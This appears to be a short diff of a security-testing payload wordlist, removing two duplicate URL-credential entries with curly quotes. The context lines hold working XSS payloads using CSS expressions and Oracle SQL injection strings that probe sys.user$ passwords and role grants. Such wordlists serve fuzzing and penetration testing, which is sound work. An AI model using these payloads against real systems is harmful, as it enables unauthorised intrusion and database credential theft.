@@ -37,7 +37,6 @@
 "exp/*<a style='no\xss:noxss(""*//*"");xss:ex/*xss*//*/*/pression(alert(""xss""))'>"
 "http://*:*@www" bob:bob
 "http://*:*@www" domainname
-"http://*:*@www” domainname
 ' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i
 ' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i
 ' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i
@@ -179,4 +178,3 @@ xss:&amp;#101;x&amp;#x2f;*xss*//*/*/pression(alert(&quot;xss&quot;))&apos;&gt;</
 xss:ex/*xss*//*/*/pression(alert("xss"))'>
 xxx<style>*{color:gre/**/en !/**/important} /* ie 6-9 standards mode */<!----><!--*{color:red}   /* all ua */*{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */</style>
 xxx<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
-“http://*:*@www” domainname
